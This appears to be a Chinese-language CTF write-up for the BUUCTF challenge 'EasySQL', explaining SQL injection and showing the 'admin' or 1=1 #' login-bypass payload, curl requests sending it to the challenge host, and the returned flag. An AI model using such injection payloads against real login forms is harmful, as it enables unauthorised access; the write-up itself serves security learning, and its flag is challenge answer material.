---
title: "1-CTF WriteUp: [极客大挑战 2019] EasySQL"
date: 2026-05-02
categories:
  - BUUCTF
  - WEB
tags:
  - CTF
  - sql注入
---
![](assets/file-20260503034103228.png)
# CTF WriteUp: [极客大挑战 2019] EasySQL

## 题目信息
- **题目名称**：EasySQL
- **题目类型**：Web (SQL注入)
- **目标地址**：http://4ad4c8ce-c976-43d3-b92b-0f71c0d7165e.node5.buuoj.cn:81/

## 知识点
1. **SQL注入 (SQL Injection)**：攻击者在 Web 应用程序中事先定义好的查询语句的结尾上添加额外的 SQL 语句，以此来实现欺骗数据库服务器执行非授权的任意查询。
2. **万能密码 (Authentication Bypass)**：利用 SQL 语句的逻辑漏洞（如 `OR 1=1` 永真条件），绕过登录验证。
3. **闭合与注释**：
   - 闭合符号：由于后端代码常将变量使用单引号 `'` 或双引号 `"` 包裹，输入相同符号可提前闭合原语句。
   - 注释符：`--+` 或 `#` (在URL中需编码为 `%23`) 用于注释掉原 SQL 语句中后续的无用代码或密码验证部分。

## 解题思路与详细步骤

### 1. 探寻题目页面
首先访问网页，发现是一个名为 “用户登陆” 的简单表单，要求输入用户名和密码。
通过查看源码或者抓包发现，表单的数据通过 `GET` 方法发送到 `check.php`。

```bash
# 获取网页源码验证请求方法
curl -s "http://4ad4c8ce-c976-43d3-b92b-0f71c0d7165e.node5.buuoj.cn:81/"
```

### 2. 构建注入 Payload
后端查询语句通常的结构类似于：
```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password'
```
我们可以通过输入 `admin' or 1=1 #` 作为用户名。带入后变成：
```sql
SELECT * FROM users WHERE username = 'admin' or 1=1 #' AND password = '$password'
```
这里 `1=1` 为永真，`#` 注释掉了后面的密码验证，从而实现无密码直接登录。

### 3. 实战操作 (Mac/Kali 环境)

因为参数是通过 GET 传递的，我们可以直接用 curl 发送带 Payload 的请求。注意，在 URL 中单引号 `'` 编码为 `%27`，空格可以用 `+` 或 `%20`，井号 `#` 编码为 `%23`。

**方法一：在本地 Mac 终端中直接请求**
```bash
curl -s "http://4ad4c8ce-c976-43d3-b92b-0f71c0d7165e.node5.buuoj.cn:81/check.php?username=admin%27+or+1%3D1%23&password=123"
```

**方法二：通过 SSH 远程调用 Kali 机器验证**
利用配置好的 Kali 环境（密码 kali）发起请求：
```bash
sshpass -p kali ssh -o StrictHostKeyChecking=no root@192.168.43.16 'curl -s "http://4ad4c8ce-c976-43d3-b92b-0f71c0d7165e.node5.buuoj.cn:81/check.php?username=admin%27+or+1%3D1%23&password=123"'
```

### 4. 获得 Flag
通过执行上述命令，服务器直接返回了登录成功的 HTML 页面，其中包含了隐藏的 Flag。

**回显内容摘要：**
```html
<h1 style='font-family:verdana;color:red;text-align:center;'>Login Success!</h1>
<p style='font-family:arial;color:#ffffff;font-size:30px;text-align:center;'>flag{ad7e1d43-b697-4d49-8d5e-4cc85681cbd7}</p>
```

## 最终 Flag
`flag{ad7e1d43-b697-4d49-8d5e-4cc85681cbd7}`
